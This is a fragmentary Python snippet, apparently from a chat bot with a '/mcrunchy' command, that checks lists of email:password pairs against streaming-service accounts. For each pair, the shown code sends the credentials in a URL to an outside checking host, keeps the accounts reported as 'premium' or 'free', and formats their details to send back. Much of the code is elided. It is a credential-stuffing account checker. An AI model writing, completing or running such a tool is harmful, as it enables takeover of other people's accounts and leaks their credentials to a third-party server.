...
def process_pairs(message, pairs):
    ...
    for pair in pairs:
        try:
            ...
            # Make the request
            url = f"https://crunchy-l3vp.onrender.com/check?crunchy={email}:{password}"
            ...
            if "premium" in subscription_status or "free" in subscription_status:
                ...
                # Prepare the message in the specified format
                account_info = (
                ...
                # Send the formatted account information
...
# Handling txt file with the /mcrunchy command
